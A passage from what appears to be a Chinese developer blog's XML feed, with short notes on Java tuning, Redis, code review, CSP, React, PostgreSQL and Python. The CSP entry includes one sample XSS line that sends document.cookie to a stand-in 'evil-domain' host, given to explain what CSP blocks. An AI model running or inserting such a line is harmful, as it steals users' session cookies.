/* body */ }void f() { synchronized(this) { /* body */ } }</code></pre>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Java 性能调优</title>
      <link href="/java/java/java-performance/"/>
      <url>/java/java/java-performance/</url>
      
        <content type="html"><![CDATA[<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>-《Java性能权威指南》</p><h1 id="性能优化的一些原则"><a href="#性能优化的一些原则" class="headerlink" title="性能优化的一些原则"></a>性能优化的一些原则</h1><ul><li>性能优化需要注意性价比，避免过早优化</li><li>找出性能瓶颈比优化更重要</li><li>JVM性能优化只是非常小的一部分，更重要的是数据库和业务逻辑</li><li>优化之前使用性能测试工具，进行基准测试</li></ul><h1 id="性能优化工具"><a href="#性能优化工具" class="headerlink" title="性能优化工具"></a>性能优化工具</h1><h2 id="操作系统工具"><a href="#操作系统工具" class="headerlink" title="操作系统工具"></a>操作系统工具</h2><ul><li>vmstat 查看CPU利用率</li><li>typeperf CPU运行队列</li><li>iostat 磁盘IO使用率</li><li>nicstat 网络使用率</li></ul><h2 id="Java-性能分析工具"><a href="#Java-性能分析工具" class="headerlink" title="Java 性能分析工具"></a>Java 性能分析工具</h2><ul><li>jcmd 显示JVM 信息工具<ul><li>jcmd jinfo 显示JVM运行参数</li><li>jdcmd process_id 显示栈运行信息 </li></ul></li><li>jsstack 显示栈运行信息</li><li>jconsole 显示Java编译</li></ul><h2 id="一些明显的-Java-性能问题"><a href="#一些明显的-Java-性能问题" class="headerlink" title="一些明显的  Java 性能问题"></a>一些明显的  Java 性能问题</h2><ul><li>SimpleDataFormat</li><li>String</li></ul>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Redis 基础</title>
      <link href="/Redis/redis/redis-foundation/"/>
      <url>/Redis/redis/redis-foundation/</url>
      
        <content type="html"><![CDATA[<p>官网: <a href="https://redis.io/" target="_blank" rel="noopener">https://redis.io/</a><br>基础教程：<a href="http://www.runoob.com/redis/redis-java.html" target="_blank" rel="noopener">http://www.runoob.com/redis/redis-java.html</a></p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。</p><h2 id="常用的数据结构"><a href="#常用的数据结构" class="headerlink" title="常用的数据结构"></a>常用的数据结构</h2><table><thead><tr><th>类型</th><th>简介</th><th>特性</th><th>场景</th></tr></thead><tbody><tr><td>String</td><td>二进制安全</td><td>可以包含任何数据,比如jpg图片或者序列化的对象,一个键最大能存储512M</td><td>—</td></tr><tr><td>Hash</td><td>键值对集合,即编程语言中的Map类型</td><td>适合存储对象,并且可以像数据库中update一个属性一样只修改某一项属性值(Memcached中需要取出整个字符串反序列化成对象修改完再序列化存回去)</td><td>存储、读取、修改用户属性</td></tr><tr><td>List</td><td>链表(双向链表)</td><td>增删快,提供了操作某一段元素的API</td><td>1,最新消息排行等功能(比如朋友圈的时间线) 2,消息队列</td></tr><tr><td>Set</td><td>哈希表实现,元素不重复</td><td>1、添加、删除,查找的复杂度都是O(1) 2、为集合提供了求交集、并集、差集等操作</td><td>1、共同好友 2、利用唯一性,统计访问网站的所有独立ip 3、好友推荐时,根据tag求交集,大于某个阈值就可以推荐</td></tr><tr><td>Sorted Set</td><td>将Set中的元素增加一个权重参数score,元素按score有序排列</td><td>数据插入集合时,已经进行天然排序</td><td>1、排行榜 2、带权重的消息队列</td></tr></tbody></table><h2 id="cli常用操作"><a href="#cli常用操作" class="headerlink" title="cli常用操作"></a>cli常用操作</h2><h3 id="Redis-Select-命令"><a href="#Redis-Select-命令" class="headerlink" title="Redis Select 命令"></a>Redis Select 命令</h3><p>Redis 有多个数据库，默认使用 0 链接，如果需要修改到 faff</p><h3 id="benchmark-性能测试"><a href="#benchmark-性能测试" class="headerlink" title="benchmark 性能测试"></a>benchmark 性能测试</h3><blockquote><p>redis-benchmark -n 10000  -q</p></blockquote><h2 id="redis-的事务特性"><a href="#redis-的事务特性" class="headerlink" title="redis 的事务特性"></a>redis 的事务特性</h2><p>Redis 事务可以一次执行多个命令， 并且带有以下三个重要的保证：</p><ul><li>批量操作在发送 EXEC 命令前被放入队列缓存。</li><li>收到 EXEC 命令后进入事务执行，事务中任意命令执行失败，其余的命令依然被执行。<br>-在事务执行过程，其他客户端提交的命令请求不会插入到事务执行命令序列中。</li><li>一个事务从开始到执行会经历以下三个阶段：<ul><li>开始事务。</li><li>命令入队。</li><li>执行事务。</li></ul></li></ul><p>Redis 事务的本质是一组命令批量执行，并不具备原子能力，也就是说中间失败剩下的还是会被执行，用处是保持时间在一起执行。</p><p>单个 Redis 命令的执行是原子性的，但 Redis 没有在事务上增加任何维持原子性的机制，所以 Redis 事务的执行并不是原子性的。</p><p>事务可以理解为一个打包的批量执行脚本，但批量指令并非原子化的操作，中间某条指令的失败不会导致前面已做指令的回滚，也不会造成后续的指令不做。</p><h2 id="在-cli-外部批量操作"><a href="#在-cli-外部批量操作" class="headerlink" title="在 cli 外部批量操作"></a>在 cli 外部批量操作</h2><p>批量删除 keys</p><blockquote><p>redis-cli keys “user*” | xargs redis-cli del</p></blockquote><p>进入 cli 模式后删除 db</p><blockquote><p>flushdb</p></blockquote><p>进入 cli 模式后删除所有</p><blockquote><p>flushall</p></blockquote><h2 id="启动-redis-server"><a href="#启动-redis-server" class="headerlink" title="启动 redis-server"></a>启动 redis-server</h2><blockquote><p>redis-server </p></blockquote><p>后台运行</p><blockquote><p>redis-server –daemonize yes</p></blockquote><p>后台运行也可以修改配置文件实现。</p><h2 id="redis-redistemplate-KEY为字符串是多双引号的问题"><a href="#redis-redistemplate-KEY为字符串是多双引号的问题" class="headerlink" title="redis redistemplate KEY为字符串是多双引号的问题"></a>redis redistemplate KEY为字符串是多双引号的问题</h2><p>原因是 redistemplate 使用json进行序列化，需要对 key value 使用不同的序列化策略。</p><p>推荐使用如下配置</p><pre><code>@Configurationpublic class RedisConfiguration {    @Bean    public GenericJackson2JsonRedisSerializer genericJackson2JsonRedisJsonSerializer() {        return new GenericJackson2JsonRedisSerializer();    }    @Bean    RedisTemplate&lt;String, Object&gt; redisTemplate(JedisConnectionFactory jedisConnectionFactory) {        final RedisTemplate&lt;String, Object&gt; restTemplate = new RedisTemplate&lt;&gt;();        restTemplate.setConnectionFactory(jedisConnectionFactory);        restTemplate.setKeySerializer(new StringRedisSerializer());        restTemplate.setValueSerializer(genericJackson2JsonRedisJsonSerializer());        return restTemplate;    }}</code></pre><p>这里定义了 key 和 value 的序列化策略，如果需要使用更多的数据类型，需要添加适当的序列化策略。</p>]]></content>
      
      
      <categories>
          
          <category> Redis </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>安全管理</title>
      <link href="/%E5%AE%89%E5%85%A8/security/security-management/"/>
      <url>/%E5%AE%89%E5%85%A8/security/security-management/</url>
      
        <content type="html"><![CDATA[<h2 id="网络威胁建模"><a href="#网络威胁建模" class="headerlink" title="网络威胁建模"></a>网络威胁建模</h2><p>微软的 Threat Modeling 是微软公司开发人员用于鉴别风险、并依据它作出更加设计、编码和测试决定的顶级安全分析方法学之一</p><p>Tool <a href="https://docs.microsoft.com/zh-cn/azure/security/azure-security-threat-modeling-tool-feature-overview" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/azure/security/azure-security-threat-modeling-tool-feature-overview</a></p><h2 id="跨功能安全需求"><a href="#跨功能安全需求" class="headerlink" title="跨功能安全需求"></a>跨功能安全需求</h2>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>代码审查的注意事项 （英文版）</title>
      <link href="/%E6%95%8F%E6%8D%B7%E5%BC%80%E5%8F%91/agile/code-review-tips/"/>
      <url>/%E6%95%8F%E6%8D%B7%E5%BC%80%E5%8F%91/agile/code-review-tips/</url>
      
        <content type="html"><![CDATA[<h2 id="通用-TIPS"><a href="#通用-TIPS" class="headerlink" title="通用 TIPS"></a>通用 TIPS</h2><ul><li>Naming should be correct and abide by the convention<ul><li>file convention </li><li>class convention </li><li>variable convention </li></ul></li><li>Hard code string and number should be refactored as constant </li><li>Keep all environment consistent </li><li>Should not expose password and private key<ul><li>Store sensitive data to environment </li><li>Store crendential to CI tool</li></ul></li><li>Remove useless comment and useless console statement </li><li>Remove any sensitive information in PROD</li><li>Remove useless file and method </li><li>Remove useless import </li><li>Import submodule as far as possible </li></ul><h2 id="Review-Java"><a href="#Review-Java" class="headerlink" title="Review Java"></a>Review Java</h2><ul><li>Should not use snapshot version </li><li>Null should be check when try to access attribute of it</li><li>Comparision should be use ‘equal’ instead of ‘==’</li><li>Util methods  should be static</li><li>Checkstyle should be turned on </li></ul><h2 id="Review-frontend"><a href="#Review-frontend" class="headerlink" title="Review frontend"></a>Review frontend</h2><ul><li>Eslint should be turned on </li><li>Component should be reused and context unrelated</li><li>Html should be sematic</li><li>Interface of component should be easy to use </li></ul>]]></content>
      
      
      <categories>
          
          <category> 敏捷开发 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Vue overview</title>
      <link href="/vue/vue/vue/"/>
      <url>/vue/vue/vue/</url>
      
        <content type="html"><![CDATA[<h2 id="VUE-核心特性"><a href="#VUE-核心特性" class="headerlink" title="VUE 核心特性"></a>VUE 核心特性</h2><h2 id="VUE-生态"><a href="#VUE-生态" class="headerlink" title="VUE 生态"></a>VUE 生态</h2><h3 id="UI框架"><a href="#UI框架" class="headerlink" title="UI框架"></a>UI框架</h3><ul><li>vuetifyjs</li><li>Mintui</li><li>Quasar</li><li>Vux</li></ul>]]></content>
      
      
      <categories>
          
          <category> vue </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>CSP 浏览器内存安全策略</title>
      <link href="/%E5%AE%89%E5%85%A8/security/csp-in-browser/"/>
      <url>/%E5%AE%89%E5%85%A8/security/csp-in-browser/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是CSP"><a href="#什么是CSP" class="headerlink" title="什么是CSP?"></a>什么是CSP?</h2><p>这里一段定义是来自于MDN社区</p><blockquote><p>Content Security Policy (CSP) is an added layer of security that helps to detect and mitigate certain types of attacks, including Cross Site Scripting (XSS) and data injection attacks. These attacks are used for everything from data theft to site defacement or distribution of malware.</p></blockquote><p>内容安全策略(CSP)是一种web应用技术用于帮助缓解大部分类型的内容注入攻击，包括XSS攻击和数据注入等，这些攻击可实现数据窃取、网站破坏和作为恶意软件分发版本等行为。该策略可让网站管理员指定客户端允许加载的各类可信任资源。</p><p>参考来源</p><p><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP" target="_blank" rel="noopener">https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP</a></p><h2 id="使用CSP的两种方式"><a href="#使用CSP的两种方式" class="headerlink" title="使用CSP的两种方式"></a>使用CSP的两种方式</h2><ul><li>通过服务器 HTTP 头部的 Content-Security-Policy 来指定</li><li><p>通过 HTML 文档的 meta 标签配置策略</p><p>例如：</p><p>使用 HTTP 头部，这里的 policy 为策略字符串</p><pre><code>Content-Security-Policy: policy</code></pre></li></ul><p>使用 HTML meta 标签的方式</p><pre><code class="HTML">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &#39;self&#39;; img-src https://*; child-src &#39;none&#39;;&quot;&gt;</code></pre><h2 id="主要防范目标"><a href="#主要防范目标" class="headerlink" title="主要防范目标"></a>主要防范目标</h2><p> CSP主要是防范 XSS 攻击，以及报告 XSS 攻击，如果页面存在漏洞让 JS 脚本注入，CSP 能限制脚本的运行，然后把损失降到最小</p><pre><code class="Javascript"> (new Image()).src = &quot;http://www.evil-domain.com/steal-cookie.php?cookie=&quot; + document.cookie;</code></pre><p> CSP 是通过限制加载到页面上的资源、域或者协议来实现的，例如，一旦入侵者找到漏洞注入了XSS攻击，入侵者可以通过 图片Ping的方式发送敏感信息到外部网站。CSP 可以指定允许信任域名下的图片、Script和样式表被加载到页面上，及时入侵者 XSS 入侵成功也无法通过这些方式发送数据，保证网站一定程度上安全。</p><p> TODO 几个例子限制加载的资源</p><p>另外 CSP 也提供了只允许加载指定协议，例如HTTPS的资源，否则自动跳转到 HTTPS 版本。</p><h2 id="使用-CSP"><a href="#使用-CSP" class="headerlink" title="使用 CSP"></a>使用 CSP</h2><p>当我们需要使用CSP生效就需要编写相应的策略，策略包括一系列指令组成和设置定的值组成。</p><p>例如，一个网站管理者允许内容来自信任的域名及其子域名 </p><pre><code>Content-Security-Policy: default-src &#39;self&#39; *.trusted.com</code></pre><p>我们再看一条策略：</p><pre><code>Content-Security-Policy: default-src &#39;self&#39;; img-src *; media-src media1.com media2.com; script-src userscripts.example.com</code></pre><p>这条策略有4个指令 img-src 为图片资源，media-src 为视频媒体资源，script-src 为脚本资源。最重要的一个是 default-src 为所有的资源默认属性，这里设置为了 ‘self’ 的含义为所有的资源再不指定的情况下只能从自身域下加载。</p><p>TODO 描述 行内脚本</p><h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><p><host-source></host-source></p><p><scheme-source><br>    self<br>    unsafe-inline<br>    unsafe-eva<br>    none<br>    nonce-&lt;base64值&gt;<br>    strict-dynamic</scheme-source></p><p>### </p><p> TODO 讲解这几种模式</p><h2 id="报告违规情况"><a href="#报告违规情况" class="headerlink" title="报告违规情况"></a>报告违规情况</h2><p>CSP 提供了另外一个非常有用的模式 - 报告模式，如果在 HTTP 头部指定 Content-Security-Policy-Report-Only 可以将发生了任何违规的事件都会被报告出去，但是这个头部只会对报告生效，实际生效还是需要 在Content-Security-Policy 中指定。</p><p>在报告的策略中需要配置一个 report-uri 用于服务器接受违规报告情况，例如：</p><pre><code>Content-Security-Policy: default-src &#39;self&#39;; report-uri http://reportcollector.example.com/collector.cgi</code></pre><p>浏览器会向 report-uri 中指定的地址使用 POST 发送一个 JSON 格式的数据包。</p><p>数据包格式如下：</p><pre><code class="JSON">{  &quot;csp-report&quot;: {    &quot;document-uri&quot;: &quot;http://example.com/signup.html&quot;,    &quot;referrer&quot;: &quot;&quot;,    &quot;blocked-uri&quot;: &quot;http://example.com/css/style.css&quot;,    &quot;violated-directive&quot;: &quot;style-src cdn.example.com&quot;,    &quot;original-policy&quot;: &quot;default-src &#39;none&#39;; style-src cdn.example.com; report-uri /_/csp-reports&quot;  }}</code></pre>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Teach Leader check list</title>
      <link href="/management/management/Tech%20leader%20check%20list/"/>
      <url>/management/management/Tech%20leader%20check%20list/</url>
      
        <content type="html"><![CDATA[<ul><li>使用C4模型绘制架构图</li><li>技术债图，管理项目技术债</li><li>依赖管理，管理项目依赖</li><li>风险管理</li><li>上线流程管理</li><li>干系人管理</li><li>影响力</li></ul>]]></content>
      
      
      <categories>
          
          <category> management </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>开发工具图谱</title>
      <link href="/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/tool/development%20tool/"/>
      <url>/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/tool/development%20tool/</url>
      
        <content type="html"><![CDATA[<h2 id="开发工具"><a href="#开发工具" class="headerlink" title="开发工具"></a>开发工具</h2><ul><li><p>编辑器</p><ul><li>VIM </li><li>Sublime </li></ul></li><li><p>VCS </p><ul><li>SVN </li><li>GIT</li></ul></li><li><p>IDE</p><ul><li>IntelliJ IDEA</li></ul></li><li><p>抓包工具</p><ul><li>Httpwatch</li><li>Wireshark</li><li>fiddler</li></ul></li><li><p>性能分析工具</p><ul><li>AB测试</li><li>网页性能分析</li><li>JMH 性能测试</li><li>zerocode 性能测试 in code</li></ul></li></ul><h2 id="设计展现工具"><a href="#设计展现工具" class="headerlink" title="设计展现工具"></a>设计展现工具</h2><ul><li><a href="https://mural.co/" target="_blank" rel="noopener">https://mural.co/</a> 在线协作绘图</li><li><a href="https://www.draw.io/" target="_blank" rel="noopener">https://www.draw.io/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 开发工具 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>超实用的工具和网站收集</title>
      <link href="/%E8%81%8C%E4%B8%9A%E7%B4%A0%E8%B4%A8/profession/tool-collections/"/>
      <url>/%E8%81%8C%E4%B8%9A%E7%B4%A0%E8%B4%A8/profession/tool-collections/</url>
      
        <content type="html"><![CDATA[<h2 id="流程图、思维导图"><a href="#流程图、思维导图" class="headerlink" title="流程图、思维导图"></a>流程图、思维导图</h2><p><a href="https://www.processon.com" target="_blank" rel="noopener">https://www.processon.com</a></p><p>可以绘制思维导图、流程图、ER图等</p><p><a href="https://coggle.it/" target="_blank" rel="noopener">https://coggle.it/</a></p><p>超漂亮的思维导图工具</p><p><img src="/职业素质/profession/tool-collections/coggle.png" alt=""></p><p><a href="http://naotu.baidu.com/" target="_blank" rel="noopener">http://naotu.baidu.com/</a></p><p>百度脑图</p><h2 id="网站"><a href="#网站" class="headerlink" title="网站"></a>网站</h2><p><a href="https://octodex.github.com/" target="_blank" rel="noopener">https://octodex.github.com/</a></p><p>github章鱼头像</p>]]></content>
      
      
      <categories>
          
          <category> 职业素质 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>API的contract测试之Pact</title>
      <link href="/%E8%B4%A8%E9%87%8F%E4%BF%9D%E8%AF%81/test/contract-testing%20&amp;%20PACT/"/>
      <url>/%E8%B4%A8%E9%87%8F%E4%BF%9D%E8%AF%81/test/contract-testing%20&amp;%20PACT/</url>
      
        <content type="html"><![CDATA[<h2 id="why"><a href="#why" class="headerlink" title="why?"></a>why?</h2><p>当我们构建API的时候，需要保证API输出稳定，因此我们可以使用契约测试。<br>我们可以定义一个契约文件，然后消费者和API提供者并行开发，最终进行集成测试。</p><h2 id="pact-和-contact的区别"><a href="#pact-和-contact的区别" class="headerlink" title="pact 和 contact的区别"></a>pact 和 contact的区别</h2><p>pact 是contact测试的一个实现</p><h2 id="我的一个契约测试的例子"><a href="#我的一个契约测试的例子" class="headerlink" title="我的一个契约测试的例子"></a>我的一个契约测试的例子</h2><ul><li><a href="https://github.com/domain-driven-design/contract-testing-mockmvc" target="_blank" rel="noopener">https://github.com/domain-driven-design/contract-testing-mockmvc</a></li></ul><h2 id="一些资源"><a href="#一些资源" class="headerlink" title="一些资源"></a>一些资源</h2><ul><li>pact文档 <a href="https://docs.pact.io" target="_blank" rel="noopener">https://docs.pact.io</a></li><li>Java 例子 <a href="https://github.com/DiUS/pact-workshop-jvm" target="_blank" rel="noopener">https://github.com/DiUS/pact-workshop-jvm</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 质量保证 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>React 资源收集</title>
      <link href="/React/react/react-recource/"/>
      <url>/React/react/react-recource/</url>
      
        <content type="html"><![CDATA[<p>React js 后端界面<br><a href="https://marmelab.com/admin-on-rest/Admin.html" target="_blank" rel="noopener">https://marmelab.com/admin-on-rest/Admin.html</a></p><p>React 测试工具</p><p><a href="https://github.com/airbnb/enzyme" target="_blank" rel="noopener">https://github.com/airbnb/enzyme</a></p><p>React 状态管理库</p><p><a href="https://github.com/reactjs/react-redux" target="_blank" rel="noopener">https://github.com/reactjs/react-redux</a></p><p>React 脚手架</p><p><a href="https://github.com/facebookincubator/create-react-app" target="_blank" rel="noopener">https://github.com/facebookincubator/create-react-app</a></p><p>React 组件库(无UI)</p><p>rc-*</p><p><a href="http://react-component.github.io/badgeboard/" target="_blank" rel="noopener">http://react-component.github.io/badgeboard/</a></p><p>Here is a list of react-component: <a href="http://react-component.github.io/badgeboard/" target="_blank" rel="noopener">http://react-component.github.io/badgeboard/</a></p><p>React component documentation tool story book</p><p><a href="https://github.com/storybooks/storybook" target="_blank" rel="noopener">https://github.com/storybooks/storybook</a></p><p>React UI和组件库</p><ul><li><a href="https://ant.design/" target="_blank" rel="noopener">https://ant.design/</a></li><li><a href="http://amazeui.org/" target="_blank" rel="noopener">http://amazeui.org/</a></li><li><a href="https://onsen.io/react/" target="_blank" rel="noopener">https://onsen.io/react/</a></li></ul><p>React boilerplate</p>]]></content>
      
      
      <categories>
          
          <category> React </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>React Native 资源收集</title>
      <link href="/React/react/react-native%20resource/"/>
      <url>/React/react/react-native%20resource/</url>
      
        <content type="html"><![CDATA[<p>官网</p><p><a href="https://facebook.github.io/react-native/" target="_blank" rel="noopener">https://facebook.github.io/react-native/</a></p><p>React Native 开发工具</p><p><a href="https://expo.io/" target="_blank" rel="noopener">https://expo.io/</a></p><p>React Native 组件</p><p><a href="https://react-native-training.github.io/react-native-elements/" target="_blank" rel="noopener">https://react-native-training.github.io/react-native-elements/</a></p><p>React Native 脚手架</p><p><a href="https://github.com/react-community/create-react-native-app" target="_blank" rel="noopener">https://github.com/react-community/create-react-native-app</a></p><p>React Native 项目案例</p><ul><li>CNode,推荐学习 <a href="https://github.com/soliury/noder-react-native" target="_blank" rel="noopener">https://github.com/soliury/noder-react-native</a></li></ul><p>React Native boilerplate</p><p><a href="https://github.com/linksgo2011/react-native-ts-most" target="_blank" rel="noopener">https://github.com/linksgo2011/react-native-ts-most</a></p><p>React Native project deployment</p>]]></content>
      
      
      <categories>
          
          <category> React </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>React学习体系</title>
      <link href="/react/react/react-crouse%20map/"/>
      <url>/react/react/react-crouse%20map/</url>
      
        <content type="html"><![CDATA[<h2 id="参考的几家课程体系："><a href="#参考的几家课程体系：" class="headerlink" title="参考的几家课程体系："></a>参考的几家课程体系：</h2><ul><li><a href="http://www.zhufengpeixun.cn/react/index.html" target="_blank" rel="noopener">http://www.zhufengpeixun.cn/react/index.html</a> </li><li><a href="http://www.jikexueyuan.com/course/reactjs/" target="_blank" rel="noopener">http://www.jikexueyuan.com/course/reactjs/</a></li><li><a href="https://roadtoreact.com/course-details?courseId=THE_ROAD_TO_LEARN_REACT" target="_blank" rel="noopener">https://roadtoreact.com/course-details?courseId=THE_ROAD_TO_LEARN_REACT</a></li></ul><h2 id="课程列表"><a href="#课程列表" class="headerlink" title="课程列表"></a>课程列表</h2><ol><li>环境搭建和ES基础<ul><li>前端开发历史沿革</li><li>开发环境</li><li>Gitflow工作流</li><li>ES6新特性介绍</li></ul></li><li>webpack工程化前端项目<ul><li>Webpack的使用</li><li>Babel使用</li><li>测试环境的准备</li><li>JS linter</li><li>Webpack各种Loader配置</li></ul></li><li>React基础<ul><li>React基本思想</li><li>JSX语法</li><li>组件生命周期</li><li>Children使用场景</li><li>高阶组件</li></ul></li><li>React生态和周边工具库<ul><li>react-router前端路由管理</li><li>React中表单数据收集、验证、回写</li><li>React文件上传</li><li>React其他开源组件使用</li><li>Enzyme测试React组件</li><li>React组件文档工具storybook</li></ul></li><li>Redux管理以及API集成<ul><li>理解redux</li><li>react-redux使用</li><li>Logger中间件</li><li>Tthunk中间件实现异步action</li><li>Redux调试工具</li></ul></li><li>CI/CD部署上线以及版本管理<ul><li>CI工具介绍</li><li>多环境配置</li><li>使用semantic-release进行版本管理</li><li>私有仓库</li></ul></li></ol><p>PS: 测试和项目实践贯穿整个过程</p>]]></content>
      
      
      <categories>
          
          <category> react </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>PostgreSQL 入门使用</title>
      <link href="/postgreSQL/postgreSQL/get%20start/"/>
      <url>/postgreSQL/postgreSQL/get%20start/</url>
      
        <content type="html"><![CDATA[<p>Tutorial</p><p><a href="http://www.postgresqltutorial.com/" target="_blank" rel="noopener">http://www.postgresqltutorial.com/</a></p><h2 id="install-postgreSQL-via-homebrew-in-mac"><a href="#install-postgreSQL-via-homebrew-in-mac" class="headerlink" title="install postgreSQL via homebrew in mac"></a>install postgreSQL via homebrew in mac</h2><blockquote><p>brew install postgresql</p></blockquote><h2 id="connect-to-postgreSQL-via-psql"><a href="#connect-to-postgreSQL-via-psql" class="headerlink" title="connect to postgreSQL via psql"></a>connect to postgreSQL via psql</h2><p>psql 是一个命令行工具操作postgreSQL</p><blockquote><p>psql -h localhost -U freewheelers –password -d freewheelers</p></blockquote><p>and type your password.</p><h2 id="常用psql命令"><a href="#常用psql命令" class="headerlink" title="常用psql命令"></a>常用psql命令</h2><p>在psql中使用\l \dt 等命令用于管理数据库，一旦打开数据，所有功能都可以使用SQL的DML、DDL语言来操作。</p><p>列出所有的数据库</p><blockquote><p>\l </p></blockquote><p>列出当前数据库所有的表</p><blockquote><p>\dt </p></blockquote><p>列出所有的functions</p><blockquote><p>\df</p></blockquote><p>列出所有的user and roles</p><blockquote><p>\du</p></blockquote><p>获取version</p><blockquote><p>SELECT version</p></blockquote><p>重复最后一次命令</p><blockquote><p>\g</p></blockquote><p>命令历史</p><blockquote><p>\s</p></blockquote><p>获取帮助</p><blockquote><p>\?</p></blockquote><p>在编辑器中编辑命令然后执行</p><blockquote><p>\e</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> postgreSQL </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>React router 登录验证方案</title>
      <link href="/react/react/React+Redux+React%20router%20authentication/"/>
      <url>/react/react/React+Redux+React%20router%20authentication/</url>
      
        <content type="html"><![CDATA[<p>使用 react 高阶函数<br><a href="https://github.com/joshgeller/react-redux-jwt-auth-example" target="_blank" rel="noopener">https://github.com/joshgeller/react-redux-jwt-auth-example</a></p><pre><code>router.jsimport {HomeView, LoginView, ProtectedView} from &#39;../views&#39;;import {requireAuthentication} from &#39;../components/AuthenticatedComponent&#39;;export default(    &lt;Route path=&#39;/&#39; component={App}&gt;        &lt;IndexRoute component={HomeView}/&gt;        &lt;Route path=&quot;login&quot; component={LoginView}/&gt;        &lt;Route path=&quot;protected&quot; component={requireAuthentication(ProtectedView)}/&gt;    &lt;/Route&gt;);</code></pre><pre><code>import React from &#39;react&#39;;import {connect} from &#39;react-redux&#39;;import {pushState} from &#39;redux-router&#39;;export function requireAuthentication(Component) {    class AuthenticatedComponent extends React.Component {        componentWillMount() {            this.checkAuth();        }        componentWillReceiveProps(nextProps) {            this.checkAuth();        }        checkAuth() {            if (!this.props.isAuthenticated) {                let redirectAfterLogin = this.props.location.pathname;                this.props.dispatch(pushState(null, `/login?next=${redirectAfterLogin}`));            }        }        render() {            return (                &lt;div&gt;                    {this.props.isAuthenticated === true                        ? &lt;Component {...this.props}/&gt;                        : null                    }                &lt;/div&gt;            )        }    }    const mapStateToProps = (state) =&gt; ({        token: state.auth.token,        userName: state.auth.userName,        isAuthenticated: state.auth.isAuthenticated    });    return connect(mapStateToProps)(AuthenticatedComponent);}</code></pre>]]></content>
      
      
      <categories>
          
          <category> react </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>PHP拓展和使用C编写自定义拓展</title>
      <link href="/php/php/php-plugin-c/"/>
      <url>/php/php/php-plugin-c/</url>
      
        <content type="html"><![CDATA[<h2 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h2><p>PHP的一个拓展方法就是使用C来编写PHP插件,可以带来极大的性能提升和实现系统层面的拓展。推荐使用C来编写,但是C++特性更为丰富并且有大量的库来支持我们的任务,因此C++也是更好的选择。</p><h2 id="相关资料"><a href="#相关资料" class="headerlink" title="相关资料"></a>相关资料</h2><ul><li>PHP 源码解读和插件编写基本知识 <a href="http://www.php-internals.com/" target="_blank" rel="noopener">http://www.php-internals.com/</a></li><li>C++库用于简化插件编写 <a href="https://github.com/rioderelfte/php-cpp-extension" target="_blank" rel="noopener">https://github.com/rioderelfte/php-cpp-extension</a></li><li>V8引擎插件 <a href="https://github.com/phpv8/v8js" target="_blank" rel="noopener">https://github.com/phpv8/v8js</a></li><li>基于php-cpp的Qr code插件 <a href="https://github.com/Leon2012/phpqrencode" target="_blank" rel="noopener">https://github.com/Leon2012/phpqrencode</a></li><li>PHP MVC框架的拓展实现 <a href="https://github.com/phalcon/cphalcon" target="_blank" rel="noopener">https://github.com/phalcon/cphalcon</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Python 入门</title>
      <link href="/python/python/python-basic/"/>
      <url>/python/python/python-basic/</url>
      
        <content type="html"><![CDATA[<h2 id="相关资源"><a href="#相关资源" class="headerlink" title="相关资源"></a>相关资源</h2><p>入门教程： <a href="http://www.runoob.com/python/python-tutorial.html" target="_blank" rel="noopener">http://www.runoob.com/python/python-tutorial.html</a></p><h2 id="Python-是什么？"><a href="#Python-是什么？" class="headerlink" title="Python 是什么？"></a>Python 是什么？</h2><p>Python 是一个高层次的结合了解释性、编译性、互动性和面向对象的脚本语言。<br>Python 的设计具有很强的可读性，相比其他语言经常使用英文关键字，其他语言的一些标点符号，它具有比其他语言更有特色语法结构。</p><ul><li>Python 是一种解释型语言： 这意味着开发过程中没有了编译这个环节。类似于PHP和Perl语言。</li><li>Python 是交互式语言： 这意味着，您可以在一个Python提示符，直接互动执行写你的程序。</li><li>Python 是面向对象语言: 这意味着Python支持面向对象的风格或代码封装在对象的编程技术。</li><li>Python 是初学者的语言：Python 对初级程序员而言，是一种伟大的语言，它支持广泛的应用程序开发，从简单的文字处理到 WWW 浏览器再到游戏。</li></ul><h2 id="安装-Python-in-Mac"><a href="#安装-Python-in-Mac" class="headerlink" title="安装 Python in Mac"></a>安装 Python in Mac</h2><p><a href="https://www.python.org/downloads/" target="_blank" rel="noopener">https://www.python.org/downloads/</a><br>推荐使用版本为2.7</p><h2 id="进入交互模式"><a href="#进入交互模式" class="headerlink" 